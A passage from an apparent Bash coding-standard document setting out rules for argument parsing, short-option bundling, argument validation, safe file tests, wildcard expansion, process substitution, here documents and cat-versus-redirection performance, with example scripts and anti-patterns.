              set -- '' $(printf -- "-%c " $(grep -o . <<<"${1:1}")) "${@:2}" ;;
```
- Allows `-vpL` instead of `-v -p -L`
- `${1:1}` removes dash, `grep -o .` splits characters, `printf -- "-%c "` adds dash to each
- `set --` replaces argument list with expanded options

**Invalid option:** `die 22 "Invalid option '$1'"` catches unrecognized options (exit code 22 = EINVAL).

**Positional arguments:** `*)` case appends to array for later processing.

**Mandatory shift:** `esac; shift; done` - Without this, infinite loop!

**The `noarg` helper:**

```bash
noarg() {
  (($# > 1)) || die 2 "Option '$1' requires an argument"
}
```

Validates option has argument before shifting. Check `(($# > 1))` ensures at least 2 args (option + value).

**Complete example:**

```bash
#!/usr/bin/env bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

declare -r VERSION='1.0.0'
#shellcheck disable=SC2155
declare -r SCRIPT_PATH=$(realpath -- "$0")
declare -r SCRIPT_DIR=${SCRIPT_PATH%/*} SCRIPT_NAME=${SCRIPT_PATH##*/}

# Default values
declare -i VERBOSE=0
declare -i DRY_RUN=0
declare -- output_file=''
declare -a files=()

# ============================================================================
# Utility Functions
# ============================================================================

error() {
  >&2 echo "[$SCRIPT_NAME] ERROR: $*"
}

die() {
  local -i exit_code=$1
  shift
  (($#)) && error "$@"
  exit "$exit_code"
}

noarg() {
  (($# > 1)) || die 2 "Option '$1' requires an argument"
}

show_help() {
  cat <<EOF
Usage: $SCRIPT_NAME [OPTIONS] FILE...

Process files with various options.

Options:
  -o, --output FILE  Output file (required)
  -v, --verbose      Verbose output
  -n, --dry-run      Dry-run mode
  -V, --version      Show version
  -h, --help         Show this help

Examples:
  $SCRIPT_NAME -o output.txt file1.txt file2.txt
  $SCRIPT_NAME -v -n -o result.txt *.txt
EOF
}

# ============================================================================
# Main Function
# ============================================================================

main() {
  # Parse arguments
  while (($#)); do case $1 in
    -o|--output)    noarg "$@"; shift
                    output_file=$1 ;;
    -v|--verbose)   VERBOSE+=1 ;;
    -n|--dry-run)   DRY_RUN=1 ;;
    -V|--version)   echo "$SCRIPT_NAME $VERSION"; exit 0 ;;
    -h|--help)      show_help; exit 0 ;;

    # Short option bundling support
    -[ovnVh]*)    #shellcheck disable=SC2046
                    set -- '' $(printf -- "-%c " $(grep -o . <<<"${1:1}")) "${@:2}" ;;
    -*)             die 22 "Invalid option '$1'" ;;
    *)              files+=("$1") ;;
  esac; shift; done

  # Make variables readonly after parsing
  readonly -- VERBOSE DRY_RUN output_file
  readonly -a files

  # Validate required arguments
  ((${#files[@]} > 0)) || die 2 'No input files specified'
  [[ -n "$output_file" ]] || die 2 'Output file required (use -o)'

  # Use parsed arguments
  ((VERBOSE)) && echo "Processing ${#files[@]} files"
  ((DRY_RUN)) && echo '[DRY RUN] Would write to:' "$output_file"

  # Process files (example logic)
  local -- file
  for file in "${files[@]}"; do
    ((VERBOSE)) && echo "Processing: $file"
    # Processing logic here
  done

  ((VERBOSE)) && echo "Would write results to: $output_file"
}

main "$@"

#fin
```

**Short option bundling examples:**

```bash
# These are equivalent:
./script -v -n -o output.txt file.txt
./script -vno output.txt file.txt

# These are equivalent:
./script -v -v -v file.txt
./script -vvv file.txt

# Mixed long and short:
./script --verbose -no output.txt --dry-run file.txt
```

**Anti-patterns:**

```bash
#  Wrong - using while [[ ]] instead of (())
while [[ $# -gt 0 ]]; do  # Verbose, less efficient

#  Correct
while (($#)); do

#  Wrong - not calling noarg before shift
-o|--output)    shift
                output_file=$1 ;;  # Fails if no argument!

#  Correct
-o|--output)    noarg "$@"; shift
                output_file=$1 ;;

#  Wrong - forgetting shift at loop end
while (($#)); do case $1 in
  ...
esac; done  # Infinite loop!

#  Correct
while (($#)); do case $1 in
  ...
esac; shift; done

#  Wrong - using if/elif chains instead of case
if [[ "$1" == '-v' ]] || [[ "$1" == '--verbose' ]]; then
  VERBOSE+=1
elif [[ "$1" == '-h' ]] || [[ "$1" == '--help' ]]; then
  show_help
  ...
fi

#  Correct - use case statement
case $1 in
  -v|--verbose) VERBOSE+=1 ;;
  -h|--help)    show_help; exit 0 ;;
  ...
esac
```

**Rationale:** Consistent structure, handles all option types, validates before use, case statement more readable than if/elif chains, arithmetic test more efficient, supports Unix conventions (bundling, short/long options).


---


**Rule: BCS0802**

## Version Output Format

**Standard format:** `<script_name> <version_number>`

The `--version` option outputs script name, space, and version number. Do **not** include the word "version" between them.

```bash
#  Correct
-V|--version)   echo "$SCRIPT_NAME $VERSION"; exit 0 ;;
# Output: myscript 1.2.3

#  Wrong - do not include the word "version"
-V|--version)   echo "$SCRIPT_NAME version $VERSION"; exit 0 ;;
# Output: myscript version 1.2.3  (incorrect)
```

**Rationale:** Follows GNU standards and Unix/Linux utility conventions (e.g., `bash --version` outputs "GNU bash, version 5.2.15").


---


**Rule: BCS0803**

## Argument Validation

**Use validation helpers to ensure option arguments exist and are valid types before processing.**

**Rationale:** Prevents silent failures (e.g., `--output --verbose` where filename is missing), provides clear error messages, validates data types before use, catches user mistakes early.

### Three Validation Patterns

**1. `noarg()` - Basic Existence Check**

```bash
noarg() {
  (($# > 1)) && [[ ${2:0:1} != '-' ]] || die 2 "Missing argument for option '$1'"
}
```

Validates that option has argument and doesn't start with `-`.
- `(($# > 1))` - At least 2 arguments remain
- `[[ ${2:0:1} != '-' ]]` - Next argument doesn't start with `-`

**Usage:**
```bash
while (($#)); do case $1 in
  -o|--output)
    noarg "$@"      # Validate argument exists
    shift
    OUTPUT="$1"
    ;;
esac; shift; done
```

**2. `arg2()` - Enhanced Validation with Safe Quoting**

```bash
arg2() {
  if ((${#@}-1<1)) || [[ "${2:0:1}" == '-' ]]; then
    die 2 "${1@Q} requires argument"
  fi
}
```

Enhanced version with better error messages using `${1@Q}` shell quoting.
- Uses `${#@}-1<1` for argument count (explicit remaining args)
- Uses `${1@Q}` to safely escape special characters in error output

**3. `arg2_num()` - Numeric Argument Validation**

```bash
arg2_num() {
  if ((${#@}-1<1)) || [[ ! "$2" =~ ^[0-9]+$ ]]; then
    die 2 "${1@Q} requires a numeric argument"
  fi
}
```

**Usage:**
```bash
while (($#)); do case $1 in
  -d|--depth)
    arg2_num "$@"   # Validate numeric
    shift
    MAX_DEPTH="$1"  # Guaranteed to be integer
    ;;
esac; shift; done
```

Validates argument exists and matches `^[0-9]+$` pattern. Rejects negative numbers, decimals, non-numeric text.

### Complete Example

```bash
declare -i MAX_DEPTH=5 VERBOSE=0
declare -- OUTPUT_FILE=''
declare -a INPUT_FILES=()

main() {
  while (($#)); do case $1 in
    -o|--output)
      arg2 "$@"                 # String validation
      shift
      OUTPUT_FILE="$1"
      ;;

    -d|--depth)
      arg2_num "$@"             # Numeric validation
      shift
      MAX_DEPTH="$1"
      ;;

    -v|--verbose)
      VERBOSE=1                 # No argument needed
      ;;

    -*)
      die 22 "Invalid option ${1@Q}"
      ;;

    *)
      INPUT_FILES+=("$1")       # Positional argument
      ;;
  esac; shift; done

  readonly -- OUTPUT_FILE MAX_DEPTH VERBOSE
}

# Validation helpers
arg2() {
  if ((${#@}-1<1)) || [[ "${2:0:1}" == '-' ]]; then
    die 2 "${1@Q} requires argument"
  fi
}

arg2_num() {
  if ((${#@}-1<1)) || [[ ! "$2" =~ ^[0-9]+$ ]]; then
    die 2 "${1@Q} requires a numeric argument"
  fi
}

noarg() {
  (($# > 1)) && [[ ${2:0:1} != '-' ]] || die 2 "Missing argument for option '$1'"
}

main "$@"
```

### Choosing the Right Validator

| Validator | Use Case | Example Options |
|-----------|----------|----------------|
| `noarg()` | Simple existence check | `-o FILE`, `-m MSG` |
| `arg2()` | String args, prevent `-` prefix | `--prefix PATH`, `--output FILE` |
| `arg2_num()` | Numeric args requiring integers | `--depth NUM`, `--retries COUNT`, `-C NUM` |

### Anti-Patterns

```bash
#  No validation - silent failure
-o|--output) shift; OUTPUT="$1" ;;
# Problem: --output --verbose � OUTPUT='--verbose'

#  No validation - type error later
-d|--depth) shift; MAX_DEPTH="$1" ;;
# Problem: --depth abc � arithmetic errors: "abc: syntax error"

#  Manual validation - verbose, repetitive, inconsistent
-p|--prefix)
  if (($# < 2)); then
    die 2 "Option '-p' requires an argument"
  fi
  shift
  PREFIX="$1"
  ;;

#  Use helpers - concise, consistent
-p|--prefix) arg2 "$@"; shift; PREFIX="$1" ;;
```

### Error Message Quality

**The `${1@Q}` pattern** safely quotes option names in error messages:

```bash
# User input: script '--some-weird$option' value
# With ${1@Q}: error: '--some-weird$option' requires argument
# Without:     error: --some-weird (crashes or expands $option)
```

See BCS04XX for detailed explanation of the `${parameter@Q}` shell quoting operator.

### Integration with Case Statements

Validators work with standard argument parsing pattern (BCS1001):

```bash
while (($#)); do case $1 in
  -d|--depth)     arg2_num "$@"; shift; MAX_DEPTH="$1" ;;
  -v|--verbose)   VERBOSE=1 ;;
  -h|--help)      show_help; exit 0 ;;
  -[dvh]*)        set -- '' $(printf -- "-%c " $(grep -o . <<<"${1:1}")) "${@:2}" ;;
  -*)             die 22 "Invalid option ${1@Q}" ;;
  *)              FILES+=("$1") ;;
esac; shift; done
```

**Critical:** Always call validator BEFORE `shift` - validator needs to inspect `$2`.


---


**Rule: BCS0804**

## Argument Parsing Location

**Recommendation:** Place argument parsing inside `main()` function rather than at top level.

**Benefits:**
- Better testability - test `main()` with different arguments
- Cleaner scoping - parsing variables local to `main()`
- Encapsulation - argument handling is part of main execution flow
- Easier mocking for unit tests

```bash
# Recommended: Parsing inside main()
main() {
  # Parse command-line arguments
  while (($#)); do
    case $1 in
      --builtin)    INSTALL_BUILTIN=1
                    BUILTIN_REQUESTED=1
                    ;;
      --no-builtin) SKIP_BUILTIN=1
                    ;;
      --prefix)     shift
                    PREFIX="$1"
                    # Update derived paths
                    BIN_DIR="$PREFIX"/bin
                    LOADABLE_DIR="$PREFIX"/lib/bash/loadables
                    ;;
      -h|--help)    show_help
                    exit 0
                    ;;
      -*)           die 22 "Invalid option '$1'"
                    ;;
      *)            >&2 show_help
                    die 2 "Unknown option '$1'"
                    ;;
    esac
    shift
  done

  # Proceed with main logic
  check_prerequisites
  build_components
  install_components
}

main "$@"
#fin
```

**Exception:** Simple scripts (< 200 lines) without `main()` may parse at top level:

```bash
#!/bin/bash
set -euo pipefail

# Simple scripts can parse at top level
while (($#)); do case $1 in
  -v|--verbose) VERBOSE=1 ;;
  -h|--help)    show_help; exit 0 ;;
  -*)           die 22 "Invalid option '$1'" ;;
  *)            FILES+=("$1") ;;
esac; shift; done

# Rest of simple script logic
```


---


**Rule: BCS0805**

## Short-Option Disaggregation in Command-Line Processing Loops

## Overview

Short-option disaggregation splits bundled options (e.g., `-abc`) into individual options (`-a -b -c`) for processing in argument parsing loops, enabling Unix-standard commands like `script -vvn` instead of `script -v -v -n`.

**Why needed:** Without disaggregation, `-lha` is treated as unknown option rather than three options (`-l`, `-h`, `-a`). Makes scripts user-friendly and Unix-compliant.

## The Three Methods

### Method 1: grep (Current Standard)

```bash
-[amLpvqVh]*) #shellcheck disable=SC2046 #split up aggregated short options
  set -- '' $(printf -- "-%c " $(grep -o . <<<"${1:1}")) "${@:2}"
  ;;
```

**How:** `${1:1}` removes dash � `grep -o .` outputs each char on separate line � `printf -- "-%c "` adds dash to each � `set --` replaces argument list.

**Pros:** Compact, well-tested, standard
**Cons:** External dependency, ~190 iter/sec, needs shellcheck disable
**Performance:** ~190 iterations/second

### Method 2: fold (Alternative)

```bash
-[amLpvqVh]*) #split up aggregated short options
  set -- '' $(printf -- "-%c " $(fold -w1 <<<"${1:1}")) "${@:2}"
  ;;
```

**How:** `fold -w1` wraps at 1-char width (splits each char to line) � `printf` adds dash � `set --` replaces args.

**Pros:** 3% faster than grep, semantically correct
**Cons:** External dependency, needs shellcheck disable
**Performance:** ~195 iterations/second

### Method 3: Pure Bash (Recommended)

```bash
-[amLpvqVh]*) # Split up single options (pure bash)
  local -- opt=${1:1}
  local -a new_args=()
  while ((${#opt})); do
    new_args+=("-${opt:0:1}")
    opt=${opt:1}
  done
  set -- '' "${new_args[@]}" "${@:2}"
  ;;
```

**How:** Extract string without dash � loop while characters remain � extract first char with dash, append to array � remove first char � replace argument list.

**Pros:** 68% faster (~318 iter/sec), no external deps, no shellcheck warnings, portable
**Cons:** More verbose (6 lines vs 1)
**Performance:** ~318 iterations/second

## Performance Comparison

| Method | Iter/Sec | Relative Speed | External Deps | Shellcheck |
|--------|----------|----------------|---------------|------------|
| grep | 190.82 | Baseline | grep | SC2046 disable |
| fold | 195.25 | +2.3% | fold | SC2046 disable |
| **Pure Bash** | **317.75** | **+66.5%** | **None** | **Clean** |

**Key:** Pure bash is 68% faster with zero dependencies.

## Implementation Examples

### Using grep (Current)

```bash
#!/usr/bin/env bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose

declare -r VERSION='1.0.0'
#shellcheck disable=SC2155
declare -r SCRIPT_PATH=$(realpath -- "$0")
declare -r SCRIPT_DIR=${SCRIPT_PATH%/*} SCRIPT_NAME=${SCRIPT_PATH##*/}

declare -i VERBOSE=0 DRY_RUN=0
declare -- output_file=''
declare -a files=()

error() { >&2 echo "$SCRIPT_NAME: error: $*"; }
die() { (($#>1)) && error "$@"; exit ${1:-0}; }
noarg() { (($# > 1)) || die 2 "Option '$1' requires an argument"; }

main() {
  while (($#)); do case $1 in
    -o|--output)    noarg "$@"; shift; output_file=$1 ;;
    -n|--dry-run)   DRY_RUN=1 ;;
    -v|--verbose)   VERBOSE+=1 ;;
    -V|--version)   echo "$SCRIPT_NAME $VERSION"; exit 0 ;;
    -h|--help)      show_help; exit 0 ;;

    # Short option bundling (grep)
    -[onvVh]*) #shellcheck disable=SC2046
                    set -- '' $(printf -- "-%c " $(grep -o . <<<"${1:1}")) "${@:2}" ;;
    -*)             die 22 "Invalid option '$1'" ;;
    *)              files+=("$1") ;;
  esac; shift; done

  readonly -- VERBOSE DRY_RUN output_file
  readonly -a files

  ((${#files[@]} > 0)) || die 2 'No input files specified'
  [[ -n "$output_file" ]] || die 2 'Output file required (use -o)'
}

main "$@"
#fin
```

### Using Pure Bash (Recommended)

```bash
#!/usr/bin/env bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose

declare -r VERSION='1.0.0'
#shellcheck disable=SC2155
declare -r SCRIPT_PATH=$(realpath -- "$0")
declare -r SCRIPT_DIR=${SCRIPT_PATH%/*} SCRIPT_NAME=${SCRIPT_PATH##*/}

declare -i VERBOSE=0 PARALLEL=1
declare -- mode='normal'
declare -a targets=()

error() { >&2 echo "$SCRIPT_NAME: error: $*"; }
die() { (($#>1)) && error "$@"; exit ${1:-0}; }
noarg() { (($# > 1)) || die 2 "Option '$1' requires an argument"; }

main() {
  while (($#)); do case $1 in
    -m|--mode)      noarg "$@"; shift; mode=$1 ;;
    -j|--parallel)  noarg "$@"; shift; PARALLEL=$1 ;;
    -v|--verbose)   VERBOSE+=1 ;;
    -V|--version)   echo "$SCRIPT_NAME $VERSION"; exit 0 ;;
    -h|--help)      show_help; exit 0 ;;

    # Pure bash disaggregation
    -[mjvVh]*) # Split up single options (pure bash)
                    local -- opt=${1:1}
                    local -a new_args=()
                    while ((${#opt})); do
                      new_args+=("-${opt:0:1}")
                      opt=${opt:1}
                    done
                    set -- '' "${new_args[@]}" "${@:2}" ;;
    -*)             die 22 "Invalid option '$1'" ;;
    *)              targets+=("$1") ;;
  esac; shift; done

  readonly -- VERBOSE PARALLEL mode
  readonly -a targets

  ((${#targets[@]} > 0)) || die 2 'No targets specified'
  [[ "$mode" =~ ^(normal|fast|safe)$ ]] || die 2 "Invalid mode: '$mode'"
  ((PARALLEL > 0)) || die 2 'Parallel jobs must be positive'
}

main "$@"
#fin
```

## Usage Examples

```bash
# Single options
./script -v -v -n file.txt

# Bundled short options
./script -vvn file.txt

# Options with arguments at end of bundle
./script -vno output.txt file.txt  # � -v -n -o output.txt

# Long options work normally
./script --verbose --verbose --dry-run file.txt

# Mixed long and short
./script -vv --dry-run -o output.txt file.txt
```

## Edge Cases

### Options Requiring Arguments

Options with arguments cannot be in middle of bundle:

```bash
#  Correct - at end or separate
./script -vno output.txt file.txt    # -v -n -o output.txt
./script -vn -o output.txt file.txt  # -v -n -o output.txt

#  Wrong - in middle
./script -von output.txt file.txt    # -o captures "n" as argument!
```

**Solution:** Options with arguments should be at bundle end, separate, or use long-form.

### Character Set Validation

Pattern `-[amLpvqVh]*` explicitly lists valid options:

```bash
-[ovnVh]*)  # Only these short options valid

./script -xyz  # Doesn't match, caught by -*) case: "Invalid option '-xyz'"
```

Prevents incorrect disaggregation of unknown options.

## Implementation Checklist

- [ ] List all valid short options in pattern: `-[ovnVh]*`
- [ ] Place disaggregation case before `-*)` invalid option case
- [ ] Ensure `shift` at end of loop for all cases
- [ ] Document bundling limitations for options-with-arguments
- [ ] Add shellcheck disable for grep/fold methods
- [ ] Test: single, bundled, mixed long/short options
- [ ] Verify stacking behavior (e.g., `-vvv`)

## Recommendations

### For New Scripts

**Use Pure Bash (Method 3)**

**Reasons:** 68% faster, no external deps, no shellcheck warnings, portable

**Trade-off:** More verbose (6 lines vs 1)

### For Existing Scripts

**Keep grep unless:**
- Performance critical
- Called frequently
- External dependencies problematic
- Restricted environment

### For High-Performance Scripts

**Always use pure bash** when:
- Called in tight loops
- Part of build systems
- Interactive tools (completion, prompts)
- Container/restricted environments
- Called thousands of times per session

## Testing

```bash
# Basic tests
./script -v -v -n file.txt          # Single
./script -vvn file.txt              # Bundled
./script -vno output.txt file.txt  # With arguments
./script -xyz                       # Should error
./script -vvvvv                     # VERBOSE=5
```

## Conclusion

Pure bash method offers 68% performance improvement with zero dependencies while maintaining identical functionality. Recommended for all new scripts unless one-liner brevity is prioritized over performance.

#fin


---


**Rule: BCS0900**

# File Operations

This section establishes safe file handling practices to prevent common shell scripting pitfalls. Covers proper file testing operators (`-e`, `-f`, `-d`, `-r`, `-w`, `-x`) with explicit quoting, safe wildcard expansion using explicit paths (`rm ./*` never `rm *`), process substitution (`< <(command)`) to avoid subshell variable issues, and here document patterns for multi-line input. These defensive practices prevent accidental deletion, handle special characters safely, and ensure reliable operations across environments.


---


**Rule: BCS0901**

## Safe File Testing

**Always quote variables and use `[[ ]]` for file tests:**

```bash
# Basic file testing
[[ -f "$file" ]] && source "$file"
[[ -d "$path" ]] || die 1 "Not a directory: $path"
[[ -r "$file" ]] || warn "Cannot read: $file"
[[ -x "$script" ]] || die 1 "Not executable: $script"

# Check multiple conditions
if [[ -f "$config" && -r "$config" ]]; then
  source "$config"
else
  die 3 "Config file not found or not readable: $config"
fi

# Check file emptiness
[[ -s "$logfile" ]] || warn 'Log file is empty'

# Compare file timestamps
if [[ "$source" -nt "$destination" ]]; then
  cp "$source" "$destination"
  info "Updated $destination"
fi
```

**File test operators:**

| Operator | Returns True If |
|----------|----------------|
| `-e file` | File exists (any type) |
| `-f file` | Regular file exists |
| `-d dir` | Directory exists |
| `-L link` | Symbolic link exists |
| `-p pipe` | Named pipe (FIFO) exists |
| `-S sock` | Socket exists |
| `-b file` | Block device exists |
| `-c file` | Character device exists |
| `-r file` | File is readable |
| `-w file` | File is writable |
| `-x file` | File is executable |
| `-s file` | File is not empty (size > 0) |
| `-u file` | File has SUID bit set |
| `-g file` | File has SGID bit set |
| `-k file` | File has sticky bit set |
| `-O file` | You own the file |
| `-G file` | File's group matches yours |
| `-N file` | File modified since last read |
| `f1 -nt f2` | f1 is newer than f2 (modification time) |
| `f1 -ot f2` | f1 is older than f2 |
| `f1 -ef f2` | f1 and f2 have same device/inode (same file) |

**Rationale:**

- Always quote `"$file"` to prevent word splitting and glob expansion
- `[[ ]]` more robust than `[ ]` or `test` command
- Test before use to prevent errors from missing/unreadable files
- Use `|| die` to fail fast when prerequisites not met
- Include filename in error messages for debugging

**Common patterns:**

```bash
# Validate required file exists and is readable
validate_file() {
  local file=$1
  [[ -f "$file" ]] || die 2 "File not found: $file"
  [[ -r "$file" ]] || die 5 "Cannot read file: $file"
}

# Check if directory is writable
ensure_writable_dir() {
  local dir=$1
  [[ -d "$dir" ]] || mkdir -p "$dir" || die 1 "Cannot create directory: $dir"
  [[ -w "$dir" ]] || die 5 "Directory not writable: $dir"
}

# Only process if file was modified
process_if_modified() {
  local source=$1
  local marker=$2

  if [[ ! -f "$marker" ]] || [[ "$source" -nt "$marker" ]]; then
    process_file "$source"
    touch "$marker"
  else
    info "File $source not modified, skipping"
  fi
}

# Check if file is executable script
is_executable_script() {
  local file=$1
  [[ -f "$file" && -x "$file" && -s "$file" ]]
}

# Safe file sourcing
safe_source() {
  local file=$1
  if [[ -f "$file" ]]; then
    if [[ -r "$file" ]]; then
      source "$file"
    else
      warn "Cannot read file: $file"
      return 1
    fi
  else
    debug "File not found: $file (optional)"
    return 0
  fi
}
```

**Anti-patterns to avoid:**

```bash
#  Wrong - unquoted variable
[[ -f $file ]]  # Breaks with spaces or special chars

#  Correct - always quote
[[ -f "$file" ]]

#  Wrong - using old [ ] syntax
if [ -f "$file" ]; then
  cat "$file"
fi

#  Correct - use [[ ]]
if [[ -f "$file" ]]; then
  cat "$file"
fi

#  Wrong - not checking before use
source "$config"  # Error if file doesn't exist

#  Correct - validate first
[[ -f "$config" ]] || die 3 "Config not found: $config"
[[ -r "$config" ]] || die 5 "Cannot read config: $config"
source "$config"

#  Wrong - silent failure
[[ -d "$dir" ]] || mkdir "$dir"  # mkdir failure not caught

#  Correct - check result
[[ -d "$dir" ]] || mkdir "$dir" || die 1 "Cannot create directory: $dir"
```

**Combining file tests:**

```bash
# Multiple conditions with AND
if [[ -f "$file" && -r "$file" && -s "$file" ]]; then
  info "Processing non-empty readable file: $file"
  process_file "$file"
fi

# Multiple conditions with OR
if [[ -f "$config1" ]]; then
  config_file=$config1
elif [[ -f "$config2" ]]; then
  config_file=$config2
else
  die 3 'No configuration file found'
fi

# Complex validation
validate_executable() {
  local script=$1

  [[ -e "$script" ]] || die 2 "File does not exist: $script"
  [[ -f "$script" ]] || die 22 "Not a regular file: $script"
  [[ -x "$script" ]] || die 126 "Not executable: $script"
  [[ -s "$script" ]] || die 22 "File is empty: $script"
}
```


---


**Rule: BCS0902**

## Wildcard Expansion
Always use explicit path prefix when expanding wildcards to prevent filenames starting with `-` from being interpreted as flags.

```bash
#  Correct - explicit path prevents flag interpretation
rm -v ./*
for file in ./*.txt; do
  process "$file"
done

#  Incorrect - filenames starting with - become flags
rm -v *
```


---


**Rule: BCS0903**

## Process Substitution

**Use process substitution `<(command)` and `>(command)` to provide command output as file-like inputs or send data to commands as if writing to files. Eliminates temp files, avoids subshell issues, enables parallel processing.**

**Rationale:**

- **No Temporary Files**: Eliminates creating, managing, cleaning up temp files
- **Avoid Subshells**: Unlike pipes to while, preserves variable scope
- **Multiple Inputs**: Commands read from multiple process substitutions simultaneously
- **Parallelism**: Multiple process substitutions run in parallel
- **Resource Efficiency**: Data streams through FIFOs/file descriptors without disk I/O

**How it works:**

Process substitution creates temporary FIFO (named pipe) or file descriptor connecting command output to another command's input.

```bash
# <(command) - Input redirection: creates /dev/fd/63 (or similar)
# Data read from this comes from command's stdout

# >(command) - Output redirection: creates /dev/fd/63 (or similar)
# Data written to this goes to command's stdin

# Example:
diff <(sort file1) <(sort file2)
# Expands to: diff /dev/fd/63 /dev/fd/64
```

**Basic patterns:**

```bash
# Input process substitution
diff <(ls dir1) <(ls dir2)
cat <(echo "Header") <(cat data.txt) <(echo "Footer")
grep pattern <(find /data -name '*.log')
paste <(cut -d: -f1 /etc/passwd) <(cut -d: -f3 /etc/passwd)

# Output process substitution
command | tee >(wc -l) >(grep ERROR) > output.txt
generate_data | tee >(process_type1) >(process_type2) > /dev/null
echo "data" > >(base64)
```

**Common use cases:**

**1. Comparing command outputs:**

```bash
diff <(ls -1 /dir1 | sort) <(ls -1 /dir2 | sort)
diff <(sha256sum /backup/file) <(sha256sum /original/file)
diff <(ssh host1 cat /etc/config) <(ssh host2 cat /etc/config)
```

**2. Reading command output into array:**

```bash
#  BEST - readarray with process substitution
declare -a users
readarray -t users < <(getent passwd | cut -d: -f1)
echo "Users: ${#users[@]}"

#  ALSO GOOD - null-delimited
declare -a files
readarray -d '' -t files < <(find /data -type f -print0)
```

**3. Avoiding subshell in while loops:**

```bash
#  CORRECT - Process substitution (no subshell)
declare -i count=0

while IFS= read -r line; do
  echo "$line"
  ((count+=1))
done < <(cat file.txt)

echo "Count: $count"  # Correct value!
```

**4. Multiple simultaneous inputs:**

```bash
# Read from multiple sources
while IFS= read -r line1 <&3 && IFS= read -r line2 <&4; do
  echo "File1: $line1"
  echo "File2: $line2"
done 3< <(cat file1.txt) 4< <(cat file2.txt)

# Merge sorted files
sort -m <(sort file1) <(sort file2) <(sort file3)
```

**5. Parallel processing with tee:**

```bash
# Process log file multiple ways simultaneously
cat logfile.txt | tee \
  >(grep ERROR > errors.log) \
  >(grep WARN > warnings.log) \
  >(wc -l > line_count.txt) \
  > all_output.log
```

**Complete example - Log analysis with parallel processing:**

```bash
#!/bin/bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

declare -r VERSION='1.0.0'
#shellcheck disable=SC2155
declare -r SCRIPT_PATH=$(realpath -- "$0")
declare -r SCRIPT_DIR=${SCRIPT_PATH%/*} SCRIPT_NAME=${SCRIPT_PATH##*/}

analyze_log() {
  local -- log_file="$1"
  local -- output_dir="${2:-.}"

  info "Analyzing $log_file..."

  # Process log file multiple ways simultaneously
  cat "$log_file" | tee \
    >(grep 'ERROR' | sort -u > "$output_dir/errors.txt") \
    >(grep 'WARN' | sort -u > "$output_dir/warnings.txt") \
    >(awk '{print $1}' | sort -u > "$output_dir/unique_timestamps.txt") \
    >(wc -l > "$output_dir/line_count.txt") \
    > "$output_dir/full_log.txt"

  wait  # Wait for all background processes

  # Report results
  local -i error_count warn_count total_lines

  error_count=$(wc -l < "$output_dir/errors.txt")
  warn_count=$(wc -l < "$output_dir/warnings.txt")
  total_lines=$(cat "$output_dir/line_count.txt")

  info "Analysis complete:"
  info "  Total lines: $total_lines"
  info "  Unique errors: $error_count"
  info "  Unique warnings: $warn_count"
}

main() {
  local -- log_file="${1:-/var/log/app.log}"
  analyze_log "$log_file"
}

main "$@"

#fin
```

**Anti-patterns:**

```bash
#  Wrong - using temp files
temp1=$(mktemp)
temp2=$(mktemp)
sort file1 > "$temp1"
sort file2 > "$temp2"
diff "$temp1" "$temp2"
rm "$temp1" "$temp2"

#  Correct - process substitution (no temp files)
diff <(sort file1) <(sort file2)

#  Wrong - pipe to while (subshell issue)
count=0
cat file | while read -r line; do
  ((count+=1))
done
echo "$count"  # Still 0!

#  Correct - process substitution (no subshell)
count=0
while read -r line; do
  ((count+=1))
done < <(cat file)
echo "$count"  # Correct value!

#  Wrong - sequential processing (reads file 3 times)
cat log | grep ERROR > errors.txt
cat log | grep WARN > warnings.txt
cat log | wc -l > count.txt

#  Correct - parallel with tee (reads once)
cat log | tee \
  >(grep ERROR > errors.txt) \
  >(grep WARN > warnings.txt) \
  >(wc -l > count.txt) \
  > /dev/null

#  Wrong - not quoting variables
diff <(sort $file1) <(sort $file2)  # Word splitting!

#  Correct - quote variables
diff <(sort "$file1") <(sort "$file2")
```

**Edge cases:**

**1. File descriptor assignment:**

```bash
# Assign process substitution to file descriptor
exec 3< <(long_running_command)

# Read from it later
while IFS= read -r line <&3; do
  echo "$line"
done

# Close when done
exec 3<&-
```

**2. NULL-delimited with process substitution:**

```bash
# Handle filenames with spaces/newlines
while IFS= read -r -d '' file; do
  echo "Processing: $file"
done < <(find /data -type f -print0)

# With readarray
declare -a files
readarray -d '' -t files < <(find /data -type f -print0)
```

**3. Nested process substitution:**

```bash
# Complex data processing
diff \
  <(sort <(grep pattern file1)) \
  <(sort <(grep pattern file2))

# Process chains
cat <(echo "header") <(sort <(grep -v '^#' data.txt)) <(echo "footer")
```

**When NOT to use:**

```bash
# Simple command output - command substitution is clearer
#  Overcomplicated
result=$(cat <(command))
#  Simpler
result=$(command)

# Single file input - direct redirection is clearer
#  Overcomplicated
grep pattern < <(cat file)
#  Simpler
grep pattern file

# Variable expansion - use here-string
#  Overcomplicated
command < <(echo "$variable")
#  Simpler
command <<< "$variable"
```

**Key principle:** Process substitution is Bash's answer to "I need this command's output to look like a file." More efficient than temp files, safer than pipes (no subshell), enables powerful parallel data processing. Use `<(command)` for input, `>(command)` for output, combine with `tee` for parallel processing.


---


**Rule: BCS0904**

## Here Documents

Use for multi-line strings or input.

**Syntax:**
- `<<'EOF'` - No variable expansion (single quotes prevent expansion)
- `<<EOF` - With variable expansion (double quotes implied)

**Examples:**

```bash
# Static content (no expansion)
cat <<'EOF'
This is a multi-line
string with no variable
expansion.
EOF

# Dynamic content (with expansion)
cat <<EOF
User: $USER
Home: $HOME
EOF
```

**Key distinction**: Quote the delimiter (`'EOF'`) to prevent variable expansion, leave unquoted to enable expansion.


---


**Rule: BCS0905**

## Input Redirection vs Cat: Performance Optimization

## Summary

Replace `cat filename` with `< filename` redirection in performance-critical contexts to eliminate process fork overhead. Provides 3-100x speedup depending on usage pattern.

## Performance Benchmarks

| Context | `cat file` | `< file` | Speedup |
|---------|-----------|----------|---------|
| Command substitution (1000�) | 0.965s | 0.009s | **107x** |
| Pipeline output (1000�) | 0.792s | 0.234s | **3.4x** |
| Large file (500�) | 0.398s | 0.115s | **3.5x** |

### Why the Performance Difference

**`cat` overhead:**
1. Fork new process
2. Exec /usr/bin/cat binary
3. Load executable into memory
4. Set up process environment
5. Read/write file
6. Wait for exit, cleanup

**`< file` redirection:**
1. Open file descriptor (in shell)
2. Read and output directly
3. Close descriptor

**`$(< file)` substitution:**
- Bash reads file directly into variable
- Zero external processes
- Builtin-like behavior (100x+ speedup)

## When to Use `< filename`

### 1. Command Substitution (Critical - 107x speedup)

```bash
